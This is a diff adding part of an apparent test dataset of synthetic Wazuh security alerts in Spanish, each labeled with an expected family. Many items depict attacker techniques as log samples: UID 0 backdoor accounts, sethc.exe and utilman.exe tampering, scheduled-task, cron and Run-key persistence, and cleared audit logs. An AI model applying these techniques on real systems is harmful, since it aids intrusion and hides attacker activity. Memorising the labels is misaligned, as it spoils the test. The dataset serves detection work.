+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: pc-adm-07 (192.0.2.31) | Location: syscheck | syscheck.path: C:\\Windows\\System32\\drivers\\etc\\hosts | syscheck.event: modified | syscheck.mode: whodata | syscheck.md5_after: 9e47d2b1c0a8f3e65b7d9c1a2e4f6b80 | full_log: File integrity monitoring: modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-099",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: pc-ventas-12 (192.0.2.47) | Location: syscheck | syscheck.path: C:\\Windows\\System32\\sethc.exe | syscheck.event: modified | syscheck.mode: whodata | syscheck.md5_after: 9e47d2b1c0a8f3e65b7d9c1a2e4f6b80 | full_log: File integrity monitoring: modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-100",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: pc-contab-03 (192.0.2.36) | Location: syscheck | syscheck.path: C:\\Windows\\System32\\utilman.exe | syscheck.event: modified | syscheck.mode: whodata | syscheck.md5_after: 9e47d2b1c0a8f3e65b7d9c1a2e4f6b80 | full_log: File integrity monitoring: modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-101",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/auth.log | data.dstuser: soporte_tmp | full_log: Oct 15 02:40:01 srv-web-01 useradd[4400]: new user: name=soporte_tmp, UID=0, GID=0, home=/root, shell=/bin/bash",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-102",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-app-03 (192.0.2.22) | Location: /var/log/auth.log | data.dstuser: backup2 | full_log: Oct 15 02:41:01 srv-app-03 useradd[4401]: new user: name=backup2, UID=0, GID=0, home=/root, shell=/bin/bash",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-103",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-bd-02 (192.0.2.20) | Location: /var/log/auth.log | data.dstuser: svc_x | full_log: Oct 15 02:42:01 srv-bd-02 useradd[4402]: new user: name=svc_x, UID=0, GID=0, home=/root, shell=/bin/bash",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-104",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-fich-01 (192.0.2.12) | Location: /var/log/auth.log | data.dstuser: adminx | full_log: Oct 15 02:43:01 srv-fich-01 useradd[4403]: new user: name=adminx, UID=0, GID=0, home=/root, shell=/bin/bash",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-105",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-dc-01 (192.0.2.5) | Location: /var/log/auth.log | data.dstuser: oper3 | full_log: Oct 15 02:44:01 srv-dc-01 useradd[4404]: new user: name=oper3, UID=0, GID=0, home=/root, shell=/bin/bash",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-106",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | data.win.system.eventID: 4720 | data.win.system.channel: Security | data.win.eventdata.targetUserName: soporte_tmp | data.win.eventdata.subjectUserName: admin.local",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-107",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | data.win.system.eventID: 4720 | data.win.system.channel: Security | data.win.eventdata.targetUserName: svc_tmp | data.win.eventdata.subjectUserName: admin.local",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-108",
+    "texto": "Rule: 100111 (level 10) -> 'cuenta o grupo nuevo, o usuario agregado a sudo' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | data.win.system.eventID: 4720 | data.win.system.channel: Security | data.win.eventdata.targetUserName: adminx | data.win.eventdata.subjectUserName: admin.local",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100111",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-109",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 4698 | data.win.system.channel: Security | data.win.eventdata.taskName: \\Actualizador0 | data.win.eventdata.subjectUserName: usuario01 | data.win.eventdata.taskContent: <Exec><Command>C:\\Users\\Public\\upd0.exe</Command></Exec><LogonTrigger/>",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-110",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 4698 | data.win.system.channel: Security | data.win.eventdata.taskName: \\Actualizador1 | data.win.eventdata.subjectUserName: usuario02 | data.win.eventdata.taskContent: <Exec><Command>C:\\Users\\Public\\upd1.exe</Command></Exec><LogonTrigger/>",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-111",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 4698 | data.win.system.channel: Security | data.win.eventdata.taskName: \\Actualizador2 | data.win.eventdata.subjectUserName: usuario03 | data.win.eventdata.taskContent: <Exec><Command>C:\\Users\\Public\\upd2.exe</Command></Exec><LogonTrigger/>",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-112",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 4698 | data.win.system.channel: Security | data.win.eventdata.taskName: \\Actualizador3 | data.win.eventdata.subjectUserName: usuario04 | data.win.eventdata.taskContent: <Exec><Command>C:\\Users\\Public\\upd3.exe</Command></Exec><LogonTrigger/>",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-113",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 4698 | data.win.system.channel: Security | data.win.eventdata.taskName: \\Actualizador4 | data.win.eventdata.subjectUserName: usuario05 | data.win.eventdata.taskContent: <Exec><Command>C:\\Users\\Public\\upd4.exe</Command></Exec><LogonTrigger/>",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-114",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: srv-web-01 (192.0.2.10) | Location: syscheck | syscheck.path: /etc/cron.d/actualiza | syscheck.event: added | syscheck.diff: ExecStart=/opt/.cache/su-upd | full_log: File added",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-115",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: srv-app-03 (192.0.2.22) | Location: syscheck | syscheck.path: /etc/systemd/system/sys-update.service | syscheck.event: added | syscheck.diff: ExecStart=/opt/.cache/su-upd | full_log: File added",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-116",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: srv-bd-02 (192.0.2.20) | Location: syscheck | syscheck.path: /etc/rc.local | syscheck.event: added | syscheck.diff: ExecStart=/opt/.cache/su-upd | full_log: File added",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-117",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 13 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.targetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd | data.win.eventdata.details: C:\\Users\\Public\\upd.exe | data.win.eventdata.image: C:\\Windows\\System32\\reg.exe | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": "",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "K150-118",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 13 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.targetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd | data.win.eventdata.details: C:\\Users\\Public\\upd.exe | data.win.eventdata.image: C:\\Windows\\System32\\reg.exe | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": "",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "K150-119",
+    "texto": "Rule: 100112 (level 10) -> 'persistencia programada (tarea, cron o arranque automático)' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 13 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.targetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd | data.win.eventdata.details: C:\\Users\\Public\\upd.exe | data.win.eventdata.image: C:\\Windows\\System32\\reg.exe | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100112",
+    "playbook_esperado": "",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "K150-120",
+    "texto": "Rule: 100113 (level 12) -> 'registro de auditoría borrado' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | data.win.system.eventID: 1102 | data.win.system.channel: Security | data.win.eventdata.subjectUserName: admin.local | data.win.eventdata.subjectDomainName: EJEMPLO",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100113",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-121",
+    "texto": "Rule: 100113 (level 12) -> 'registro de auditoría borrado' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | data.win.system.eventID: 1102 | data.win.system.channel: Security | data.win.eventdata.subjectUserName: admin.local | data.win.eventdata.subjectDomainName: EJEMPLO",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100113",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-122",
+    "texto": "Rule: 100113 (level 12) -> 'registro de auditoría borrado' | Agent: srv-app-03 (192.0.2.22) | Location: /var/log/audit/audit.log | full_log: Oct 15 03:10:00 srv-app-03 auditd[1]: audit log cleared (truncate /var/log/audit/audit.log)",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100113",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-123",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-web-01 (192.0.2.10) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sdb1 524288000 524288000 0 100% /var/lib/postgresql",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-124",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-app-03 (192.0.2.22) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sdc1 524288000 524288000 0 100% /var",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-125",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-bd-02 (192.0.2.20) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sdd1 524288000 524288000 0 100% /var/log",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-126",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-fich-01 (192.0.2.12) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sde1 524288000 524288000 0 100% /",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-127",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-dc-01 (192.0.2.5) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sdb1 524288000 524288000 0 100% /var/ossec",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-128",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-vpn-01 (192.0.2.4) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sdc1 524288000 524288000 0 100% /data",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-129",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-dns-01 (192.0.2.53) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sdd1 524288000 524288000 0 100% /home",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-130",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-correo-01 (192.0.2.15) | Location: df -P | full_log: ossec: output: 'df -P': /dev/sde1 524288000 524288000 0 100% /var/lib/docker",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-131",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'pc-adm-07->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-132",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent disconnected: 'pc-ventas-12->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-133",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'pc-contab-03->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-134",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent disconnected: 'pc-ventas-14->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-135",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'pc-rrhh-02->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-136",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent disconnected: 'srv-web-01->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-137",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'srv-app-03->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-138",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent disconnected: 'srv-bd-02->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-139",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'srv-fich-01->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-140",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent disconnected: 'srv-dc-01->any'.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-141",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-web-01 (192.0.2.10) | Location: df -P | full_log: ossec: Partition usage reached 100% on /boot",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-142",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-app-03 (192.0.2.22) | Location: df -P | full_log: ossec: Partition usage reached 100% on /tmp",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-143",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-bd-02 (192.0.2.20) | Location: df -P | full_log: ossec: Partition usage reached 100% on /var/lib/mysql",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-144",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-fich-01 (192.0.2.12) | Location: df -P | full_log: ossec: Partition usage reached 100% on /srv",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-145",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-dc-01 (192.0.2.5) | Location: df -P | full_log: ossec: Partition usage reached 100% on /opt",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-146",
+    "texto": "Rule: 100114 (level 7) -> 'disco lleno' | Agent: srv-vpn-01 (192.0.2.4) | Location: df -P | full_log: ossec: Partition usage reached 100% on /var/spool",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100114",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-147",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'srv-web-01->any'. Last keepalive 03:00 UTC.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-148",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'srv-app-03->any'. Last keepalive 03:01 UTC.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-149",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'srv-bd-02->any'. Last keepalive 03:02 UTC.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-150",
+    "texto": "Rule: 100115 (level 7) -> 'agente de Wazuh desconectado o detenido' | Agent: soar-core () | Location: wazuh-monitord | full_log: ossec: Agent stopped: 'srv-fich-01->any'. Last keepalive 03:03 UTC.",
+    "familia_esperada": "F6",
+    "familia_candidata": "F6",
+    "regla": "100115",
+    "playbook_esperado": ""
+  }
+]
